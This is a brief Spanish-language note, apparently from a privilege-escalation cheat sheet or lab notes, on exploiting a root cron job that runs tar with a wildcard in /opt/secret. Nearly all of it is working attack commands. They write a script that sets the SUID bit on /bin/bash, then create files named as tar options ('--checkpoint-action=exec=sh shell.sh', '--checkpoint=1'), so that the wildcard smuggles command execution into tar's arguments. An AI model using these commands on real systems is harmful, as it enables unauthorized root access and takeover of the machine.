# Tar
Crontab se ve así:
```
* *   * * *   cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
```
Vamos a /opt/secret
```
echo "#!/bin/bash\nchmod u+s /bin/bash" > shell.sh
---
echo "" > "--checkpoint-action=exec=sh shell.sh"
---
echo "" > --checkpoint=1
```
